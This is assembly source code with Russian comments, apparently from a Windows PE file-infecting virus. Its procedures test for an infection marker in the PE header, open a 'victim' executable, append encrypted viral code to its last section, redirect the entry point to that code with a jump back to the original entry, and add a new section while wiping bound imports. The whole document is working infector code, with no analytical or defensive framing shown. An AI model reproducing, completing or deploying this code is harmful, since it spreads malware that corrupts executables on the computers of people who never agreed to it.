;===============================================================================;
;Процедура IsInfect
;Описание: Заражен ли файл?
;Вход:
;	hMap - файл в памяти
;===============================================================================;
IsInfect proc hMap:DWORD
	startproc
;Получение адреса PE-заголовка
	assume edi:ptr IMAGE_DOS_HEADER
	mov edi,hMap
	add edi,[edi].e_lfanew
;Получение адреса файлового заголовка
	add edi,4
;Получение адреса опционального заголовка
	add edi,sizeof IMAGE_FILE_HEADER
;Не заражен ли уже файл?
	assume edi:PTR IMAGE_OPTIONAL_HEADER
	.IF [edi].Win32VersionValue==00BADF11Eh
		mov eax,1;файл уже заражен
		endproc
		ret
	.ENDIF
	mov eax,0
	endproc
	ret
IsInfect endp
;===============================================================================;


;===============================================================================;
;Макрос GetAlignUp
;Описание:
;Получение выровненного-вверх значения
;Вход:  ForAlign - значение для выравнивания
;	AlignFact - выравнивающий фактор
;Выход:eax - выровненное значение
;===============================================================================;
GetAlignUp macro ForAlign,AlignFact
	mov esi,ForAlign
	mov edi,AlignFact
	dec edi
	add esi,edi
	not edi
	and esi,edi
	mov eax,esi
endm
;===============================================================================;


;===============================================================================;
;Процедура IsOverlay
;Описание:
;Есть ли оверлей в PE файле?
;Вход:  
;	hMap - PE-файл
;	FileSize - размер файла
;Выход: EAX = 1 - да, EAX = 0 - нет
;===============================================================================;
IsOverlay proc FileSize:DWORD,hMap:DWORD
LOCAL pOptionalHeader:DWORD
LOCAL pFileHeader:DWORD
LOCAL pSectionHeader:DWORD
LOCAL pLastSection:DWORD
LOCAL FileAlignment:DWORD
LOCAL pDataDirectory:DWORD
LOCAL pSectionTable:DWORD
;Получение адреса PE-заголовка
	startproc
	assume edi:ptr IMAGE_DOS_HEADER
	mov edi,hMap
	add edi,[edi].e_lfanew
;Получение адреса файлового заголовка
	add edi,4
	mov pFileHeader,edi
;Получение адреса опционального заголовка
	add edi,sizeof IMAGE_FILE_HEADER
	mov pOptionalHeader,edi
	assume edi:ptr IMAGE_OPTIONAL_HEADER
	push DWORD PTR [edi].FileAlignment
	pop FileAlignment
;Получение адреса таблицы директорий
	lea edi,[edi].DataDirectory
	mov pDataDirectory,edi
;Получение адреса таблицы секций
	mov edi,pOptionalHeader
	mov eax,[edi].NumberOfRvaAndSizes
	mov edi,pDataDirectory
	mov edx,sizeof IMAGE_DATA_DIRECTORY
	mul edx
	add edi,eax
	mov pSectionTable,edi
;Находим последнюю секцию виртуально и физически
	mov edi,pFileHeader
	assume edi:ptr IMAGE_FILE_HEADER
	xor ecx,ecx
	mov cx,word ptr [edi].NumberOfSections
	mov edi,pSectionTable
	assume edi:ptr IMAGE_SECTION_HEADER
	mov eax,[edi].PointerToRawData
	push ebx
	mov ebx,[edi].VirtualAddress
	add edi,sizeof IMAGE_SECTION_HEADER
	dec ecx
NextSection:
.IF (eax<[edi].PointerToRawData)&&(ebx<[edi].VirtualAddress)
	mov eax,[edi].PointerToRawData
	mov ebx,[edi].VirtualAddress
	mov pLastSection,edi;указатель на запись о последней секции
.ENDIF
add edi,sizeof IMAGE_SECTION_HEADER
	loop NextSection
;Есть ли смещение?
	mov edi,pLastSection
	mov edx,[edi].SizeOfRawData
	push edi
	GetAlignUp edx,FileAlignment
	pop edi
	add eax,[edi].PointerToRawData;В EAX - Смещение в файле последней секции
	pop ebx
	.if eax<FileSize
		mov ecx,FileSize
		sub ecx,eax;В ecx - размер оверлея
		.if ecx<400;Сносим этот оверлей, т.к. там находиться лажовая отладочная инфа
			endproc
			mov eax,0
			ret
		.endif
		endproc
		mov eax,1;оверлей есть!
		ret
	.ENDIF
	endproc
	mov eax,0
	ret
IsOverlay endp
;===============================================================================;


;===============================================================================;
;Процедура InfectExLastSection
;Описание:
;Заражение PE-файла с помощью расширения последней секции
;Вход:  hMap - жертва
;	hMap2 - код
;	File2Size - размер кода
;	Delta - дельта-смещение
;Выход: EAX = 1 если заразил, иначе EAX = 0
;===============================================================================;
InfectExLastSection proc Name2:DWORD,hMap:DWORD,hMap2:DWORD,File2Size:DWORD,Delta:DWORD
LOCAL	pPE:DWORD
LOCAL	pSectionTable:DWORD
LOCAL	pDataDirectory:DWORD
LOCAL	pFileHeader:DWORD
LOCAL 	pOptionalHeader:DWORD
LOCAL 	SizeOfCode:DWORD
LOCAL	AddressOfCode:DWORD
LOCAL 	pLastSection:DWORD
LOCAL 	hFile:DWORD
LOCAL 	UpdatedhMap:DWORD
LOCAL 	hMapping:DWORD
LOCAL 	FileSize:DWORD
	startproc
	mov eax,File2Size
	add eax,7
	push eax

	push hMap
	call GetFileAlignment
	pop esi
	mov edi,eax
	GetAlignUp esi,edi
	push eax

	push NULL
	push FILE_ATTRIBUTE_NORMAL
	push OPEN_EXISTING
	push NULL
	push FILE_SHARE_WRITE or FILE_SHARE_READ
	push GENERIC_WRITE or GENERIC_READ
	push Name2
	mov edx,Delta
	call dword ptr [edx+_CreateFileA]

	.if eax==-1
		endproc
		xor eax,eax
		ret
	.endif 
	mov hFile,eax

	push 0
	push hFile
	mov edx,Delta
	call dword ptr [edx+_GetFileSize]
	
	push 0
	push hFile
	mov edx,Delta
	call dword ptr [edx+_GetFileSize]
	mov FileSize,eax
	
	pop esi
	add esi,eax
;Получаем размер зараженного EXE-файла
	push NULL
	push esi
	push NULL
	push PAGE_READWRITE
	push NULL
	push hFile
	mov edx,Delta
	call dword ptr [edx+_CreateFileMappingA]
	.if eax==0
		endproc
		xor eax,eax
		ret
	.endif
	mov hMapping,eax
	push 0
	push 0
	push 0
	push FILE_MAP_ALL_ACCESS
	push eax
	mov edx,Delta
	call dword ptr [edx+_MapViewOfFile]
	.if eax==0
		jmp cl2
	.endif
	mov UpdatedhMap,eax
;Проверка правильности PE-файла и ошибок при проекции
	push UpdatedhMap
	pop hMap

	push hMap
	call ValidPE
	.IF eax==0
		jmp cl2
	.ENDIF
;Получение адреса PE-заголовка
	assume edi:ptr IMAGE_DOS_HEADER
	mov edi,hMap
	add edi,[edi].e_lfanew
	mov pPE,edi
;Получение адреса файлового заголовка
	add edi,4
	mov pFileHeader,edi
;Получение адреса опционального заголовка
	add edi,sizeof IMAGE_FILE_HEADER
	mov pOptionalHeader,edi
;Получение адреса таблицы директорий
	assume edi:ptr IMAGE_OPTIONAL_HEADER
	lea edi,[edi].DataDirectory
	mov pDataDirectory,edi
;Получение адреса таблицы секций
	mov edi,pOptionalHeader
	mov eax,[edi].NumberOfRvaAndSizes
	mov edi,pDataDirectory
	mov ecx,sizeof IMAGE_DATA_DIRECTORY
	mul ecx
	add edi,eax
	mov pSectionTable,edi
;Пометить файл как зараженный
	mov edi,pOptionalHeader
	assume edi:PTR IMAGE_OPTIONAL_HEADER
	lea edi,[edi].Win32VersionValue
	mov DWORD PTR [edi],00BADF11Eh
;Не заражен ли уже файл?
;................................
;Находим последнюю секцию виртуально и физически
	mov edi,pFileHeader
	assume edi:ptr IMAGE_FILE_HEADER
	xor ecx,ecx
	mov cx,word ptr [edi].NumberOfSections
	mov edi,pSectionTable
	assume edi:ptr IMAGE_SECTION_HEADER
	mov eax,[edi].PointerToRawData
	push ebx
	mov ebx,[edi].VirtualAddress
	add edi,sizeof IMAGE_SECTION_HEADER
	dec ecx
NextSection:
	.IF (eax<[edi].PointerToRawData)&&(ebx<[edi].VirtualAddress)
		mov eax,[edi].PointerToRawData
		mov ebx,[edi].VirtualAddress
		mov pLastSection,edi;указатель на запись о последней секции
	.ENDIF
	add edi,sizeof IMAGE_SECTION_HEADER
loop NextSection
	pop ebx
;Не нулевая ли последняя секция?
	mov edi,pLastSection
	.IF [edi].SizeOfRawData==0;последняя секция нулевая
		jmp cl2
	.ENDIF
;Запись в конец последней секции
	mov ecx,File2Size;количество байт, которые надо записать
	mov edi,pLastSection
	mov eax,[edi].PointerToRawData
	add eax,[edi].SizeOfRawData
	add eax,hMap
	mov edi,eax
	mov esi,hMap2
;Шифрование всего кода
	mov edx,Delta
	push edx
	call Crypt
jmp x
	dw "DA";Это нужно чтобы подобных совпадений в коде не было. А это важно в процедуре шифрования, которая по эти байтам судит что эти байты шифровать не надо
x:
;Записываем код
	rep movsb
;Расшифровка всего кода
	mov edx,Delta
	push edx
	call Crypt
;Переход на старую точку входа
	mov esi,pOptionalHeader
	assume esi:ptr IMAGE_OPTIONAL_HEADER
	mov eax,[esi].AddressOfEntryPoint;В EAX - старая точка входа
	add eax,[esi].ImageBase
	mov byte ptr [edi],0B8h;BF - опкод команды mov edi,XXXXXXX
	inc edi
	push eax
	pop dword ptr [edi];Джампим к старой точке входа
	add edi,4
	mov word ptr [edi],0E0FFh;FFE0 - опкод команды jmp edi
;Правка AddressOfEntryPoint
	mov edi,pLastSection
	assume edi:ptr IMAGE_SECTION_HEADER
	mov eax,[edi].VirtualAddress
	add eax,[edi].SizeOfRawData
	mov edi,pOptionalHeader
	assume edi:ptr IMAGE_OPTIONAL_HEADER
	lea edi,[edi].AddressOfEntryPoint
	mov dword ptr [edi],eax
;Чего-то...
	assume edi:ptr IMAGE_SECTION_HEADER
	mov edi,pLastSection
	mov eax,[edi].Misc.VirtualSize
	mov ecx,File2Size
	add ecx,7
	add eax,ecx

	mov edi,pOptionalHeader
	assume edi:ptr IMAGE_OPTIONAL_HEADER

	mov edi,[edi].SectionAlignment
	mov esi,eax
	GetAlignUp esi,edi

	mov edi,pLastSection
	assume edi:ptr IMAGE_SECTION_HEADER
	lea esi,[edi].Misc.VirtualSize
	mov dword ptr [esi],eax;Правка VirtualSize

	mov esi,[edi].SizeOfRawData
	add esi,ecx

	mov edi,pOptionalHeader
	assume edi:ptr IMAGE_OPTIONAL_HEADER
	mov edi,[edi].FileAlignment
	GetAlignUp esi,edi
	mov edi,pLastSection
	assume edi:ptr IMAGE_SECTION_HEADER
	lea edi,[edi].SizeOfRawData
	mov dword ptr [edi],eax;Правка SizeOfRawData

	mov edi,pLastSection
	assume edi:ptr IMAGE_SECTION_HEADER
	lea esi,[edi].Misc.VirtualSize
	mov dword ptr [esi],eax;Правка VirtualSize

	mov edi,pLastSection
	mov [edi].Characteristics,0a0000020H;Правим характеристики

	mov esi,pOptionalHeader
	assume esi:ptr IMAGE_OPTIONAL_HEADER
	mov eax,[edi].Misc.VirtualSize
	add eax,[edi].VirtualAddress

	lea edi,[esi].SizeOfImage;Правка ImageSize
	mov dword ptr [edi],eax
cl2:
	mov edx,Delta
	push hMapping
	call dword ptr [edx+_CloseHandle]
	mov edx,Delta
	push hFile
	call dword ptr [edx+_CloseHandle]
	push UpdatedhMap
	mov edx,Delta
	call dword ptr [edx+_UnmapViewOfFile]
	endproc
	mov eax,1
	ret
InfectExLastSection endp
;===============================================================================;


;===============================================================================;
;Процедура GetFileAlignment
;Получение выровненного-вверх значения
;Вход: 
; hMap - адлрес в памяти файла
;Выход: eax - значение FileAlignment
;===============================================================================;
GetFileAlignment proc hMap:DWORD
	startproc
	mov edi,hMap
;Получение адреса PE-заголовка
	assume edi:ptr IMAGE_DOS_HEADER
	add edi,[edi].e_lfanew
;Получение адреса файлового заголовка
	add edi,4
;Получение адреса опционального заголовка
	add edi,sizeof IMAGE_FILE_HEADER
	assume edi:ptr IMAGE_OPTIONAL_HEADER
	mov eax,[edi].FileAlignment
	endproc
	ret
GetFileAlignment endp
;===============================================================================;


;===============================================================================;
;Процедура NewSection
;Описание:
;Добавяет новую секцию в PE-файл
;Вход:  
;	FileName - имя файла жертвы
;	hMap - жертва
;	hMap2 - код
;	File2Size - размер кода
;	Delta - дельта-смещение
;Выход: EAX = 1 если добавил, иначе нет.
;===============================================================================;
NewSection proc FileName:DWORD,hMap:DWORD,Delta:DWORD
LOCAL	hFile:DWORD
LOCAL	FileSize:DWORD
LOCAL   pOptionalHeader:DWORD
LOCAL   pDataDirectory:DWORD
LOCAL   pSectionTable:DWORD
LOCAL   pLastSection:DWORD
LOCAL 	AddressOfCode:DWORD
LOCAL 	pFileHeader:DWORD
LOCAL 	hMapping:DWORD
	startproc
;Вычисляем новый размер
	push NULL
	push FILE_ATTRIBUTE_NORMAL
	push OPEN_EXISTING
	push NULL
	push FILE_SHARE_READ or FILE_SHARE_WRITE
	push GENERIC_WRITE or GENERIC_READ
	push FileName
	mov edx,Delta
	call dword ptr [edx+_CreateFileA]
	.if eax==-1
		endproc
		xor eax,eax
		ret
	.endif	

	mov hFile,eax
	push 0
	push hFile
	mov edx,Delta
	call dword ptr [edx+_GetFileSize]
	mov FileSize,eax

	push eax
	push hMap
	call GetFileAlignment
	mov esi,eax
	pop eax
	add esi,eax;В esi - новый размер файла
;File Mapping Instructions
	push NULL
	push esi
	push NULL
	push PAGE_READWRITE
	push NULL
	push hFile
	mov edx,Delta
	call dword ptr [edx+_CreateFileMappingA]
	.if eax==0
		endproc
		xor eax,eax
		ret
	.endif
	mov hMapping,eax
	push 0
	push 0
	push 0
	push FILE_MAP_ALL_ACCESS
	push eax
	mov edx,Delta
	call dword ptr [edx+_MapViewOfFile]
	.if eax==0
		endproc
		xor eax,eax
		ret
	.endif
	mov hMap,eax
;Проверка правильности PE-файла и ошибок при проекции
	.IF hMap==0;ошибка открытия файла
		jmp cl1
	.ENDIF
	push hMap
	call ValidPE
	.IF eax==0
		jmp cl1
	.ENDIF
;Получение адреса PE-заголовка
	assume edi:ptr IMAGE_DOS_HEADER
	mov edi,hMap
	add edi,[edi].e_lfanew
;Получение адреса файлового заголовка
	add edi,4
	mov pFileHeader,edi
;Получение адреса опционального заголовка
	add edi,sizeof IMAGE_FILE_HEADER
	mov pOptionalHeader,edi
;Получение адреса таблицы директорий
	assume edi:ptr IMAGE_OPTIONAL_HEADER
	lea edi,[edi].DataDirectory
	mov pDataDirectory,edi
;Получение адреса талицы секций
	mov edi,pOptionalHeader
	mov eax,[edi].NumberOfRvaAndSizes
	mov edi,pDataDirectory
	mov edx,sizeof IMAGE_DATA_DIRECTORY
	mul edx
	add edi,eax
	mov pSectionTable,edi
;Находим последнюю секцию виртуально
	mov edi,pFileHeader
	assume edi:ptr IMAGE_FILE_HEADER
	xor ecx,ecx
	mov cx,word ptr [edi].NumberOfSections
	mov edi,pSectionTable
	assume edi:ptr IMAGE_SECTION_HEADER
	mov eax,[edi].VirtualAddress
	add edi,sizeof IMAGE_SECTION_HEADER
	dec ecx
NextSection:
	.IF (eax<[edi].VirtualAddress)
		mov eax,[edi].VirtualAddress
		mov pLastSection,edi;указатель на запись о последней секции
	.ENDIF
	add edi,sizeof IMAGE_SECTION_HEADER
loop NextSection
;Поиск и удаление Bound-импортов
	mov edi,pDataDirectory
	mov edx,sizeof IMAGE_DATA_DIRECTORY
	mov eax,IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT
	mul edx
	add edi,eax;в EDI - запись в таблице директорий о привязанном импорте
	cld
	mov al,0
	mov ecx,sizeof IMAGE_DATA_DIRECTORY
	rep stosb;забиваем нулями информацию о расположении bound-импорта
;Поиск конца таблицы секций+1
	mov edi,pFileHeader
	assume edi:ptr IMAGE_FILE_HEADER
	xor eax,eax
	mov ax,[edi].NumberOfSections
	mov edx,sizeof IMAGE_SECTION_HEADER
	mul edx;теперь в eax - количество байт занимаемых всеми секциями
	mov edi,pSectionTable
	add edi,eax;теперь в edi - пространство для новой записи в таблице секций
	mov AddressOfCode,edi;сохраняем начало записи новой секции
;Получаем информацию для новой секции
	mov edi,pLastSection
	assume edi:ptr IMAGE_SECTION_HEADER
	mov eax,[edi].VirtualAddress
	add eax,[edi].SizeOfRawData
	push eax

	mov esi,pOptionalHeader
	assume esi:ptr IMAGE_OPTIONAL_HEADER
	mov eax,[esi].SectionAlignment

	pop esi
	mov edi,eax
	GetAlignUp esi,edi;eax - Виртуальный адрес новой секции
	push eax
;Заполняем нулями пространствно в таблице секций
	mov edi,AddressOfCode
	mov ecx,40;размер IMAGE_SECTION_HEADER
	mov al,0
	rep stosb
;Вставляем информацию о новой секции
	mov edi,AddressOfCode
	assume edi:ptr IMAGE_SECTION_HEADER
	mov dword ptr [edi].Name1,'slt.';имя секции

	assume esi:ptr IMAGE_OPTIONAL_HEADER
	mov esi,pOptionalHeader
	mov eax,[esi].FileAlignment

	mov dword ptr [edi].Misc.VirtualSize,eax
	pop dword ptr [edi].VirtualAddress

	push edi
	mov esi,eax
	push esi

	assume esi:ptr IMAGE_OPTIONAL_HEADER
	mov esi,pOptionalHeader
	mov eax,[esi].FileAlignment
	mov edi,eax
	pop esi
	GetAlignUp esi,edi
	pop edi
	mov dword ptr [edi].SizeOfRawData,eax

	mov eax,FileSize
	mov dword ptr [edi].PointerToRawData,eax
	mov dword ptr [edi].Characteristics,40000040H

	mov edi,AddressOfCode
	assume edi:ptr IMAGE_SECTION_HEADER
;Запись
	assume esi:ptr IMAGE_OPTIONAL_HEADER
	mov esi,pOptionalHeader
	mov ecx,[esi].FileAlignment

	mov al,0
	mov edi,FileSize
	add edi,hMap
	rep stosb;Запись
;Правка ImageSize
	mov edi,pLastSection
	add edi,sizeof IMAGE_SECTION_HEADER
	assume edi:ptr IMAGE_SECTION_HEADER
	mov eax,[edi].Misc.VirtualSize
	add eax,[edi].VirtualAddress
	mov edi,pOptionalHeader
	assume edi:ptr IMAGE_OPTIONAL_HEADER
	lea edi,[edi].SizeOfImage;Правка ImageSize
	mov dword ptr [edi],eax
;Правка Number Of Section
	mov edi,pFileHeader
	assume edi:ptr IMAGE_FILE_HEADER
	lea edi,[edi].NumberOfSections
	inc word ptr [edi]
cl1:
	push hFile
	mov edx,Delta
	call dword ptr [edx+_CloseHandle]
	push hMapping
	mov edx,Delta
	call dword ptr [edx+_CloseHandle]
	push hMap
	mov edx,Delta
	call dword ptr [edx+_UnmapViewOfFile]
	endproc
	ret
NewSection endp
;=============================================================================;